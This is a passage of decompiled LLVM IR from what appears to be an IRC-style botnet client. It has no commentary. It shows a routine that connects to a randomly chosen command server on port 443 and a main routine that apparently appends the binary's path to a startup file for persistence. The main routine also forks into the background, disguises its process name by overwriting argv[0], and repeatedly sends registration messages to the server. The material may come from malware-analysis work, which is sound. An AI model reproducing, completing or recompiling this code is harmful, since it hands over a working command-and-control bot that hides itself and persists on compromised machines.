  %v2_9e44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9e44, i32* @fp, align 4
  %v2_9e5c = load i32, i32* @global_var_30218.94, align 4
  store i32 %v2_9e5c, i32* @r0, align 4
  %v0_9e64 = call i32 @free()
  %v1_9e70 = call i32 @makestring(i32 %v0_9e64)
  %v2_9e7c = ptrtoint i32* %stack_var_-74 to i32
  %v3_9e88 = call i32 @strcpy(i32 %v2_9e7c, i8* bitcast (i32* @global_var_1d244.124 to i8*))
  store i32 %v1_9e70, i32* @r1, align 4
  %v2_9e98 = bitcast i32* %stack_var_-74 to i8*
  %v3_9e98 = call i32 @strcat(i8* %v2_9e98, i32 %v1_9e70)
  store i32 %v2_9e7c, i32* @global_var_30218.94, align 4
  ret i32 %v3_9e98

; uselistorder directives
  uselistorder i32 %v1_9e70, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9ebc = load i32, i32* @fp, align 4
  store i32 40644, i32* %stack_var_-4, align 4
  %v2_9ec0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ec0, i32* @fp, align 4
  %v2_9fe4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_9fe8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_a054 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_9ecc

dec_label_pc_9ecc:                                ; preds = %dec_label_pc_9ecc.backedge, %entry
  store i32 -1, i32* @global_var_3021c.43, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_9ee4 = load i32, i32* @global_var_2b8f8.127, align 4
  %v2_9ee8 = icmp eq i32 %v2_9ee4, 0
  br i1 %v2_9ee8, label %dec_label_pc_9ef0, label %dec_label_pc_9f24

dec_label_pc_9ef0:                                ; preds = %dec_label_pc_9ecc
  %v0_9ef0 = call i32 @random()
  %v2_9efc = load i32, i32* @global_var_27030.129, align 4
  %v2_9f08 = srem i32 %v0_9ef0, %v2_9efc
  %v4_9f18 = mul i32 %v2_9f08, 4
  %v5_9f18 = add i32 %v4_9f18, ptrtoint ([14 x i8]** @global_var_27034.132 to i32)
  %v6_9f18 = inttoptr i32 %v5_9f18 to i32*
  %v7_9f18 = load i32, i32* %v6_9f18, align 4
  store i32 %v7_9f18, i32* @global_var_30224.134, align 4
  br label %dec_label_pc_9f24

dec_label_pc_9f24:                                ; preds = %dec_label_pc_9ecc, %dec_label_pc_9ef0
  store i32 0, i32* @global_var_2b8f8.127, align 4
  br label %dec_label_pc_9f30

dec_label_pc_9f30:                                ; preds = %dec_label_pc_9f30, %dec_label_pc_9f24
  %v0_9f3c = call i32 @socket()
  store i32 %v0_9f3c, i32* @global_var_3021c.43, align 4
  %v1_9f54 = icmp slt i32 %v0_9f3c, 0
  br i1 %v1_9f54, label %dec_label_pc_9f30, label %dec_label_pc_9f5c

dec_label_pc_9f5c:                                ; preds = %dec_label_pc_9f30
  %v2_9f60 = load i32, i32* @global_var_30224.134, align 4
  store i32 %v2_9f60, i32* @r0, align 4
  %v1_9f68 = call i32 @inet_addr(i32 %v2_9f60)
  %v2_9f70 = icmp eq i32 %v1_9f68, 0
  br i1 %v2_9f70, label %dec_label_pc_9f94, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f5c
  %v2_9f7c = load i32, i32* @global_var_30224.134, align 4
  store i32 %v2_9f7c, i32* @r0, align 4
  %v1_9f84 = call i32 @inet_addr(i32 %v2_9f7c)
  %v3_9f8c = icmp eq i32 %v1_9f84, -1
  br i1 %v3_9f8c, label %dec_label_pc_9f94, label %dec_label_pc_a008

dec_label_pc_9f94:                                ; preds = %dec_label_pc_9f78, %dec_label_pc_9f5c
  %v2_9f98 = load i32, i32* @global_var_30224.134, align 4
  %v1_9fa0 = call i32 @__GI_gethostbyname(i32 %v2_9f98)
  %v2_9fb0 = icmp eq i32 %v1_9fa0, 0
  br i1 %v2_9fb0, label %dec_label_pc_9fb8, label %dec_label_pc_9fd8

dec_label_pc_9fb8:                                ; preds = %dec_label_pc_9f94
  store i32 0, i32* @global_var_30224.134, align 4
  %v2_9fc8 = load i32, i32* @global_var_3021c.43, align 4
  store i32 %v2_9fc8, i32* @r0, align 4
  %v0_9fd0 = call i32 @close()
  br label %dec_label_pc_9ecc.backedge

dec_label_pc_9ecc.backedge:                       ; preds = %dec_label_pc_9fb8, %dec_label_pc_a188
  br label %dec_label_pc_9ecc

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9f94
  %v1_9fdc = add i32 %v1_9fa0, 16
  %v2_9fdc = inttoptr i32 %v1_9fdc to i32*
  %v3_9fdc = load i32, i32* %v2_9fdc, align 4
  %v1_9fe0 = inttoptr i32 %v3_9fdc to i32*
  %v2_9fe0 = load i32, i32* %v1_9fe0, align 4
  %v1_9ff0 = add i32 %v1_9fa0, 12
  %v2_9ff0 = inttoptr i32 %v1_9ff0 to i32*
  %v3_9ff0 = load i32, i32* %v2_9ff0, align 4
  store i32 %v3_9ff0, i32* @r2, align 4
  %v3_a000 = call i32 @bcopy(i32 %v2_9fe0, i32 %v2_9fe8, i32 %v3_9ff0)
  br label %dec_label_pc_a020

dec_label_pc_a008:                                ; preds = %dec_label_pc_9f78
  %v2_a00c = load i32, i32* @global_var_30224.134, align 4
  store i32 %v2_a00c, i32* @r0, align 4
  %v1_a014 = call i32 @inet_addr(i32 %v2_a00c)
  store i32 %v1_a014, i32* %stack_var_-40, align 4
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9fd8, %dec_label_pc_a008
  store i32 2, i32* %stack_var_-44, align 4
  %v1_a038 = call i32 @htons(i32 443)
  %v2_a050 = load i32, i32* @global_var_3021c.43, align 4
  store i32 %v2_a050, i32* @r0, align 4
  %v3_a064 = call i32 @ioctl(i32 %v2_a050, i32 21537, i32 %v2_a054)
  %v2_a06c = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_a168

dec_label_pc_a07c:                                ; preds = %dec_label_pc_a168
  %v0_a07c = call i32 @__errno_location()
  %v2_a088 = inttoptr i32 %v0_a07c to i32*
  store i32 0, i32* %v2_a088, align 4
  %v2_a090 = load i32, i32* @global_var_3021c.43, align 4
  store i32 %v2_a090, i32* @r0, align 4
  store i32 %v2_9fe4, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_a0a4 = call i32 @connect()
  %v2_a0ac = icmp eq i32 %v0_a0a4, 0
  br i1 %v2_a0ac, label %dec_label_pc_a0c8, label %dec_label_pc_a0b4

dec_label_pc_a0b4:                                ; preds = %dec_label_pc_a07c
  %v0_a0b4 = call i32 @__errno_location()
  %v1_a0bc = inttoptr i32 %v0_a0b4 to i32*
  %v2_a0bc = load i32, i32* %v1_a0bc, align 4
  %v7_a0c0 = icmp eq i32 %v2_a0bc, 106
  br i1 %v7_a0c0, label %dec_label_pc_a0c8, label %dec_label_pc_a138

dec_label_pc_a0c8:                                ; preds = %dec_label_pc_a0b4, %dec_label_pc_a07c
  %v2_a0cc = load i32, i32* @global_var_3021c.43, align 4
  %v6_a0e8 = call i32 @__GI_setsockopt(i32 %v2_a0cc, i32 1, i32 13, i32* null, i32 0)
  %v2_a0f0 = load i32, i32* @global_var_3021c.43, align 4
  %v6_a10c = call i32 @__GI_setsockopt(i32 %v2_a0f0, i32 1, i32 2, i32* null, i32 0)
  %v2_a114 = load i32, i32* @global_var_3021c.43, align 4
  %v6_a130 = call i32 @__GI_setsockopt(i32 %v2_a114, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_9ebc, i32* @fp, align 4
  ret i32 %v6_a130

dec_label_pc_a138:                                ; preds = %dec_label_pc_a0b4
  %v0_a138 = call i32 @__errno_location()
  %v1_a140 = inttoptr i32 %v0_a138 to i32*
  %v2_a140 = load i32, i32* %v1_a140, align 4
  %v7_a144 = icmp eq i32 %v2_a140, 115
  br i1 %v7_a144, label %dec_label_pc_a160, label %dec_label_pc_a14c

dec_label_pc_a14c:                                ; preds = %dec_label_pc_a138
  %v0_a14c = call i32 @__errno_location()
  %v1_a154 = inttoptr i32 %v0_a14c to i32*
  %v2_a154 = load i32, i32* %v1_a154, align 4
  %v7_a158 = icmp eq i32 %v2_a154, 114
  br i1 %v7_a158, label %dec_label_pc_a160, label %dec_label_pc_a188

dec_label_pc_a160:                                ; preds = %dec_label_pc_a14c, %dec_label_pc_a138
  %v1_a164 = call i32 @sleep(i32 1)
  br label %dec_label_pc_a168

dec_label_pc_a168:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a160
  %v2_a16c = call i32 @__GI_time(i32* null)
  %v2_a17c = sub i32 %v2_a16c, %v2_a06c
  %tmp = icmp ult i32 %v2_a17c, 10
  br i1 %tmp, label %dec_label_pc_a07c, label %dec_label_pc_a188

dec_label_pc_a188:                                ; preds = %dec_label_pc_a14c, %dec_label_pc_a168
  store i32 0, i32* @global_var_30224.134, align 4
  %v2_a198 = load i32, i32* @global_var_3021c.43, align 4
  store i32 %v2_a198, i32* @r0, align 4
  %v0_a1a0 = call i32 @close()
  br label %dec_label_pc_9ecc.backedge

; uselistorder directives
  uselistorder i32 %v3_9ff0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_a188, { 1, 0 }
  uselistorder label %dec_label_pc_a168, { 1, 0 }
  uselistorder label %dec_label_pc_a020, { 1, 0 }
  uselistorder label %dec_label_pc_9ecc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_9f24, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-2704 = alloca i32, align 4
  %stack_var_-6800 = alloca i32, align 4
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-390 = alloca i32, align 4
  %stack_var_-1680 = alloca i32, align 4
  %stack_var_-656 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_a1c8 = load i32, i32* @r4, align 4
  store i32 %v3_a1c8, i32* %stack_var_-20, align 4
  store i32 41424, i32* %stack_var_-4, align 4
  %v16_a1c8 = ptrtoint i32* %stack_var_-20 to i32
  %v2_a1cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a1cc, i32* @fp, align 4
  %v3_a1e4 = add i32 %v16_a1c8, -6784
  %v4_a1e4 = inttoptr i32 %v3_a1e4 to i32*
  store i32 %argc, i32* %v4_a1e4, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_1d268.136 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d038.58 to i32), i32* @r1, align 4
  %v3_a208 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1d268.136 to i32), i32 ptrtoint (i32* @global_var_1d038.58 to i32))
  %v2_a218 = icmp eq i32 %v3_a208, 0
  br i1 %v2_a218, label %dec_label_pc_a220, label %dec_label_pc_a23c

dec_label_pc_a220:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1d27c.139 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d038.58 to i32), i32* @r1, align 4
  %v3_a230 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1d27c.139 to i32), i32 ptrtoint (i32* @global_var_1d038.58 to i32))
  br label %dec_label_pc_a23c

dec_label_pc_a23c:                                ; preds = %entry, %dec_label_pc_a220
  %stack_var_-72.0 = phi i32 [ %v3_a230, %dec_label_pc_a220 ], [ %v3_a208, %entry ]
  %stack_var_-76.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1d27c.139, i32 0, i32 0), %dec_label_pc_a220 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1d268.136, i32 0, i32 0), %entry ]
  %v2_a240 = icmp eq i32 %stack_var_-72.0, 0
  br i1 %v2_a240, label %dec_label_pc_a3d0, label %dec_label_pc_a248

dec_label_pc_a248:                                ; preds = %dec_label_pc_a23c
  %v1_a258 = bitcast i8** %argv to i32*
  %v2_a258 = load i32, i32* %v1_a258, align 4
  %v1_a25c = inttoptr i32 %v2_a258 to i8*
  %v3_a260 = call i32 @strlen(i8* %v1_a25c)
  %v2_a274 = ptrtoint i32* %stack_var_-340 to i32
  %v2_a280 = call i32 @getcwd(i32 %v2_a274, i32 256)
  store i32 ptrtoint (i32* @global_var_1d28c.141 to i32), i32* @r1, align 4
  %v2_a290 = bitcast i32* %stack_var_-340 to i8*
  %v3_a290 = call i32 @__GI_strcoll(i8* %v2_a290, i32 ptrtoint (i32* @global_var_1d28c.141 to i32))
  %v2_a298 = icmp eq i32 %v3_a290, 0
  br i1 %v2_a298, label %dec_label_pc_a3c8, label %dec_label_pc_a2b0

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a2b0
  %v1_a2a8 = add i32 %stack_var_-60.0, -1
  br label %dec_label_pc_a2b0

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a248, %dec_label_pc_a2a4
  %stack_var_-60.0 = phi i32 [ %v1_a2a8, %dec_label_pc_a2a4 ], [ %v3_a260, %dec_label_pc_a248 ]
  %v2_a2c0 = load i32, i32* %v1_a258, align 4
  %v2_a2c8 = add i32 %v2_a2c0, %stack_var_-60.0
  %v1_a2cc = inttoptr i32 %v2_a2c8 to i8*
  %v2_a2cc = load i8, i8* %v1_a2cc, align 1
  %v7_a2d0 = icmp eq i8 %v2_a2cc, 47
  br i1 %v7_a2d0, label %dec_label_pc_a2d8, label %dec_label_pc_a2a4

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a2b0
  %v2_a2f4 = ptrtoint i32* %stack_var_-656 to i32
  store i32 %v2_a2f4, i32* @r0, align 4
  %v4_a308 = call i32 @sprintf(i32 %v2_a2f4, i32 ptrtoint ([8 x i8]* @global_var_1d290.143 to i32), i32 %v2_a274)
  %v1_a35c = inttoptr i32 %stack_var_-72.0 to i8*
  %v2_a314 = ptrtoint i32* %stack_var_-1680 to i32
  %v2_a33c = bitcast i32* %stack_var_-1680 to i8*
  br label %dec_label_pc_a358.outer

dec_label_pc_a310:                                ; preds = %dec_label_pc_a358
  %v3_a324 = call i32 @fgets(i32 %v2_a314, i32 1024, i32 %stack_var_-72.0)
  %v3_a33c = call i32 @__GI_strcasecmp(i8* %v2_a33c, i32 %v2_a2f4)
  %v2_a344 = icmp eq i32 %v3_a33c, 0
  br i1 %v2_a344, label %dec_label_pc_a34c, label %dec_label_pc_a358

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a310
  %v1_a350 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_a358.outer

dec_label_pc_a358.outer:                          ; preds = %dec_label_pc_a34c, %dec_label_pc_a2d8
  %stack_var_-56.0.ph = phi i32 [ %v1_a350, %dec_label_pc_a34c ], [ 0, %dec_label_pc_a2d8 ]
  br label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %dec_label_pc_a358.outer, %dec_label_pc_a310
  %v2_a35c = call i32 @feof(i8* %v1_a35c)
  %v2_a364 = icmp eq i32 %v2_a35c, 0
  br i1 %v2_a364, label %dec_label_pc_a310, label %dec_label_pc_a36c

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a358
  %v2_a370 = icmp eq i32 %stack_var_-56.0.ph, 0
  %v2_a37c = call i32 @__GI_fclose(i8* %v1_a35c)
  br i1 %v2_a370, label %dec_label_pc_a378, label %dec_label_pc_a3d0

dec_label_pc_a378:                                ; preds = %dec_label_pc_a36c
  %v4_a380 = ptrtoint i8* %stack_var_-76.0 to i32
  store i32 %v4_a380, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d298.145 to i32), i32* @r1, align 4
  %v3_a388 = call i32 @__GI_fopen(i32 %v4_a380, i32 ptrtoint (i32* @global_var_1d298.145 to i32))
  %v2_a398 = icmp eq i32 %v3_a388, 0
  br i1 %v2_a398, label %dec_label_pc_a3d0, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a378
  %v2_a3ac = call i32 @__GI_fputs(i32 %v2_a2f4, i32 %v3_a388)
  %v1_a3b4 = inttoptr i32 %v3_a388 to i8*
  %v2_a3b4 = call i32 @__GI_fclose(i8* %v1_a3b4)
  br label %dec_label_pc_a3d0

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a248
  %v1_a3cc = inttoptr i32 %stack_var_-72.0 to i8*
  %v2_a3cc = call i32 @__GI_fclose(i8* %v1_a3cc)
  br label %dec_label_pc_a3d0

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a36c, %dec_label_pc_a378, %dec_label_pc_a23c, %dec_label_pc_a3a0, %dec_label_pc_a3c8
  %v0_a3d0 = call i32 @fork()
  %v2_a3d8 = icmp eq i32 %v0_a3d0, 0
  br i1 %v2_a3d8, label %dec_label_pc_a3e8, label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a3d0
  %v1_a3e4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3d0, %dec_label_pc_a3e0
  %v1_a3f8 = bitcast i8** %argv to i32*
  %v2_a3f8 = load i32, i32* %v1_a3f8, align 4
  store i32 %v2_a3f8, i32* @r4, align 4
  %v2_a40c = load i32, i32* %v1_a3f8, align 4
  %v1_a410 = inttoptr i32 %v2_a40c to i8*
  %v3_a414 = call i32 @strlen(i8* %v1_a410)
  %v0_a41c = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1d29c.147 to i32), i32* @r1, align 4
  %v4_a428 = call i32 @strncpy(i32 %v0_a41c, i32 ptrtoint ([6 x i8]* @global_var_1d29c.147 to i32), i32 %v3_a414)
  br label %dec_label_pc_a4ac

dec_label_pc_a438:                                ; preds = %dec_label_pc_a4ac
  %v3_a43c = mul i32 %storemerge13, 4
  %v2_a454 = add i32 %v3_a43c, %tmp
  %v1_a458 = inttoptr i32 %v2_a454 to i32*
  %v2_a458 = load i32, i32* %v1_a458, align 4
  store i32 %v2_a458, i32* @r4, align 4
  %v2_a47c = load i32, i32* %v1_a458, align 4
  %v1_a480 = inttoptr i32 %v2_a47c to i8*
  %v3_a484 = call i32 @strlen(i8* %v1_a480)
  %v0_a48c = load i32, i32* @r4, align 4
  store i32 %v0_a48c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v3_a484, i32* @r2, align 4
  %v0_a49c = call i32 @__GI_memset()
  %v1_a4a4 = add i32 %storemerge13, 1
  br label %dec_label_pc_a4ac

dec_label_pc_a4ac:                                ; preds = %dec_label_pc_a3e8, %dec_label_pc_a438
  %storemerge13 = phi i32 [ 1, %dec_label_pc_a3e8 ], [ %v1_a4a4, %dec_label_pc_a438 ]
  %v4_a4bc = load i32, i32* %v4_a1e4, align 4
  %v5_a4c4 = icmp slt i32 %storemerge13, %v4_a4bc
  br i1 %v5_a4c4, label %dec_label_pc_a438, label %dec_label_pc_a4c8

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a4ac
  %v2_a4cc = call i32 @__GI_time(i32* null)
  store i32 %v2_a4cc, i32* @r4, align 4
  %v0_a4d4 = call i32 @__libc_getpid()
  %v0_a4dc = load i32, i32* @r4, align 4
  %v2_a4dc = xor i32 %v0_a4dc, %v0_a4d4
  store i32 %v2_a4dc, i32* @r4, align 4
  %v0_a4e0 = call i32 @getppid()
  %v0_a4e8 = load i32, i32* @r4, align 4
  %v2_a4e8 = add i32 %v0_a4e8, %v0_a4e0
  %v1_a4f0 = call i32 @srand(i32 %v2_a4e8)
  %v1_a4fc = call i32 @makestring(i32 %v1_a4f0)
  %v2_a50c = ptrtoint i32* %stack_var_-390 to i32
  %v3_a518 = call i32 @strcpy(i32 %v2_a50c, i8* bitcast (i32* @global_var_1d244.124 to i8*))
  store i32 %v1_a4fc, i32* @r1, align 4
  %v2_a52c = bitcast i32* %stack_var_-390 to i8*
  %v3_a52c = call i32 @strcat(i8* %v2_a52c, i32 %v1_a4fc)
  store i32 %v2_a50c, i32* @global_var_30218.94, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1d2a4.152 to i32), i32* @global_var_30210.60, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1d2a8.156 to i32), i32* @global_var_30220.154, align 4
  store i32 ptrtoint (i32* @global_var_1d2b4.159 to i32), i32* @global_var_30230.64, align 4
  store i32 ptrtoint (i32* @global_var_1d244.124 to i32), i32* @global_var_3022c.104, align 4
  store i32 ptrtoint (i32* @global_var_1d244.124 to i32), i32* @global_var_30214.162, align 4
  store i32 0, i32* @global_var_30224.134, align 4
  %v2_a5ec = ptrtoint i32* %stack_var_-656 to i32
  %v2_a6ac = ptrtoint i32* %stack_var_-400 to i32
  %v2_a8cc = ptrtoint i32* %stack_var_-6800 to i32
  %v2_a908 = add i32 %v16_a1c8, -6780
  %v2_a9c4 = ptrtoint i32* %stack_var_-2704 to i32
  %v2_aa78 = ptrtoint i32* %stack_var_-1680 to i32
  %v3_ab50 = bitcast i32* %stack_var_-1680 to i8*
  br label %dec_label_pc_a58c

dec_label_pc_a58c:                                ; preds = %dec_label_pc_a8bc, %dec_label_pc_a628, %dec_label_pc_ab40, %dec_label_pc_a4c8
  %v0_a58c = call i32 @con()
  %v2_a594 = load i32, i32* @global_var_3021c.43, align 4
  %v2_a59c = load i32, i32* @global_var_30214.162, align 4
  %v4_a5ac = call i32 @Send(i32 %v2_a594, i32 ptrtoint ([9 x i8]* @global_var_1d2b8.166 to i32), i32 %v2_a59c)
  %v2_a5b4 = load i32, i32* @global_var_3021c.43, align 4
  %v2_a5bc = load i32, i32* @global_var_30218.94, align 4
  store i32 %v2_a5bc, i32* @ip, align 4
  %v2_a5c4 = load i32, i32* @global_var_30210.60, align 4
  store i32 %v2_a5c4, i32* @lr, align 4
  %v4_a5e4 = call i32 @Send(i32 %v2_a5b4, i32 ptrtoint ([41 x i8]* @global_var_1d2c4.168 to i32), i32 %v2_a5bc)
  br label %dec_label_pc_a600.lr.ph

dec_label_pc_a600.lr.ph:                          ; preds = %dec_label_pc_a874, %dec_label_pc_a8f8, %dec_label_pc_ab60, %dec_label_pc_ab80, %dec_label_pc_a58c
  br label %dec_label_pc_a600

dec_label_pc_a600:                                ; preds = %dec_label_pc_a600.lr.ph, %dec_label_pc_a600
  %storemerge1428 = phi i32 [ 0, %dec_label_pc_a600.lr.ph ], [ %v1_a614, %dec_label_pc_a600 ]
  %v5_a60c = mul nuw nsw i32 %storemerge1428, 4
  %v6_a60c = add i32 %v5_a60c, %v2_a5ec
  %v7_a60c = inttoptr i32 %v6_a60c to i32*
  store i32 0, i32* %v7_a60c, align 4
  %v1_a614 = add nuw nsw i32 %storemerge1428, 1
  %tmp75 = icmp ult i32 %v1_a614, 32
  br i1 %tmp75, label %dec_label_pc_a600, label %dec_label_pc_a628

dec_label_pc_a628:                                ; preds = %dec_label_pc_a600
  %v2_a62c = load i32, i32* @global_var_3021c.43, align 4
  %v3_a630 = udiv i32 %v2_a62c, 32
  %v3_a644 = mul nuw nsw i32 %v3_a630, 4
  %v2_a64c = add i32 %v3_a644, %v16_a1c8
  %v2_a650 = add i32 %v2_a64c, -636
  %v1_a654 = inttoptr i32 %v2_a650 to i32*
  %v2_a654 = load i32, i32* %v1_a654, align 4
  %v1_a660 = urem i32 %v2_a62c, 32
  %v6_a668 = shl i32 1, %v1_a660
  %v2_a66c = or i32 %v2_a654, %v6_a668
  store i32 %v2_a66c, i32* %v1_a654, align 4
  store i32 1200, i32* %stack_var_-400, align 4
  %v2_a6a0 = load i32, i32* @global_var_3021c.43, align 4
  %v1_a6a4 = add i32 %v2_a6a0, 1
  %v5_a6c0 = call i32 @__libc_select(i32 %v1_a6a4, i32 %v2_a5ec, i32 0, i32 0, i32 %v2_a6ac)
  %tmp76 = icmp slt i32 %v5_a6c0, 1
  br i1 %tmp76, label %dec_label_pc_a58c, label %dec_label_pc_a860.preheader

dec_label_pc_a860.preheader:                      ; preds = %dec_label_pc_a628
  %v2_a864106 = load i32, i32* @global_var_2b908.52, align 4
  %v3_a86c108 = icmp eq i32 %v2_a864106, 0
  br i1 %v3_a86c108, label %dec_label_pc_a874, label %dec_label_pc_a6dc

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a854, %dec_label_pc_a860.preheader
  %storemerge15115 = phi i32 [ %.pre133, %dec_label_pc_a854 ], [ 0, %dec_label_pc_a860.preheader ]
  %v3_a6e0 = mul i32 %storemerge15115, 4
  %v2_a6ec = load i32, i32* @global_var_30234.54, align 4
  %v2_a6f0 = add i32 %v2_a6ec, %v3_a6e0
  %v1_a6f4 = inttoptr i32 %v2_a6f0 to i32*
  %v2_a6f4 = load i32, i32* %v1_a6f4, align 4
  %v3_a704 = call i32 @waitpid(i32 %v2_a6f4, i32 0, i32 1)
  %tmp77 = icmp slt i32 %v3_a704, 1
  %.pre133 = add i32 %storemerge15115, 1
  br i1 %tmp77, label %dec_label_pc_a854, label %dec_label_pc_a76c.preheader

dec_label_pc_a76c.preheader:                      ; preds = %dec_label_pc_a6dc
  %v2_a77085 = load i32, i32* @global_var_2b908.52, align 4
  %v3_a77887 = icmp ult i32 %.pre133, %v2_a77085
  %v3_a78488 = mul i32 %.pre133, 4
  %v2_a79089 = load i32, i32* @global_var_30234.54, align 4
  %v2_a79490 = add i32 %v2_a79089, %v3_a78488
  %v1_a79891 = add i32 %v2_a79490, -4
  br i1 %v3_a77887, label %dec_label_pc_a724, label %dec_label_pc_a780

dec_label_pc_a724:                                ; preds = %dec_label_pc_a76c.preheader, %dec_label_pc_a724
  %v1_a79895 = phi i32 [ %v1_a798, %dec_label_pc_a724 ], [ %v1_a79891, %dec_label_pc_a76c.preheader ]
  %v2_a79494 = phi i32 [ %v2_a794, %dec_label_pc_a724 ], [ %v2_a79490, %dec_label_pc_a76c.preheader ]
  %v1_a71892 = phi i32 [ %v1_a718, %dec_label_pc_a724 ], [ %.pre133, %dec_label_pc_a76c.preheader ]
  %v1_a758 = inttoptr i32 %v2_a79494 to i32*
  %v2_a758 = load i32, i32* %v1_a758, align 4
  %v2_a75c = inttoptr i32 %v1_a79895 to i32*
  store i32 %v2_a758, i32* %v2_a75c, align 4
  %v1_a718 = add i32 %v1_a71892, 1
  %v2_a770 = load i32, i32* @global_var_2b908.52, align 4
  %v3_a778 = icmp ult i32 %v1_a718, %v2_a770
  %v3_a784 = mul i32 %v1_a718, 4
  %v2_a790 = load i32, i32* @global_var_30234.54, align 4
  %v2_a794 = add i32 %v2_a790, %v3_a784
  %v1_a798 = add i32 %v2_a794, -4
  br i1 %v3_a778, label %dec_label_pc_a724, label %dec_label_pc_a76c.dec_label_pc_a780_crit_edge

dec_label_pc_a76c.dec_label_pc_a780_crit_edge:    ; preds = %dec_label_pc_a724
  br label %dec_label_pc_a780

dec_label_pc_a780:                                ; preds = %dec_label_pc_a76c.dec_label_pc_a780_crit_edge, %dec_label_pc_a76c.preheader
  %v1_a798.lcssa = phi i32 [ %v1_a798, %dec_label_pc_a76c.dec_label_pc_a780_crit_edge ], [ %v1_a79891, %dec_label_pc_a76c.preheader ]
  %v2_a7a0 = inttoptr i32 %v1_a798.lcssa to i32*
  store i32 0, i32* %v2_a7a0, align 4
  %v2_a7a8 = load i32, i32* @global_var_2b908.52, align 4
  %v1_a7ac = add i32 %v2_a7a8, -1
  store i32 %v1_a7ac, i32* @global_var_2b908.52, align 4
  %v3_a7c0 = mul i32 %v1_a7ac, 4
  %v1_a7c4 = add i32 %v3_a7c0, 4
  %v1_a7cc = call i32 @malloc(i32 %v1_a7c4)
  %v2_a82899 = load i32, i32* @global_var_2b908.52, align 4
  %v3_a830101 = icmp eq i32 %v2_a82899, 0
  br i1 %v3_a830101, label %dec_label_pc_a838, label %dec_label_pc_a7e4

dec_label_pc_a7e4:                                ; preds = %dec_label_pc_a780, %dec_label_pc_a7e4
  %storemerge17102 = phi i32 [ %v1_a81c, %dec_label_pc_a7e4 ], [ 0, %dec_label_pc_a780 ]
  %v3_a7e8 = mul i32 %storemerge17102, 4
  %v2_a7f4 = add i32 %v3_a7e8, %v1_a7cc
  %v2_a808 = load i32, i32* @global_var_30234.54, align 4
  %v2_a80c = add i32 %v2_a808, %v3_a7e8
  %v1_a810 = inttoptr i32 %v2_a80c to i32*
  %v2_a810 = load i32, i32* %v1_a810, align 4
  %v2_a814 = inttoptr i32 %v2_a7f4 to i32*
  store i32 %v2_a810, i32* %v2_a814, align 4
  %v1_a81c = add i32 %storemerge17102, 1
  %v2_a828 = load i32, i32* @global_var_2b908.52, align 4
  %v3_a830 = icmp ult i32 %v1_a81c, %v2_a828
  br i1 %v3_a830, label %dec_label_pc_a7e4, label %dec_label_pc_a824.dec_label_pc_a838_crit_edge

dec_label_pc_a824.dec_label_pc_a838_crit_edge:    ; preds = %dec_label_pc_a7e4
  br label %dec_label_pc_a838

dec_label_pc_a838:                                ; preds = %dec_label_pc_a780, %dec_label_pc_a824.dec_label_pc_a838_crit_edge
  %v2_a83c = load i32, i32* @global_var_30234.54, align 4
  store i32 %v2_a83c, i32* @r0, align 4
  %v0_a844 = call i32 @free()
  store i32 %v1_a7cc, i32* @global_var_30234.54, align 4
  br label %dec_label_pc_a854

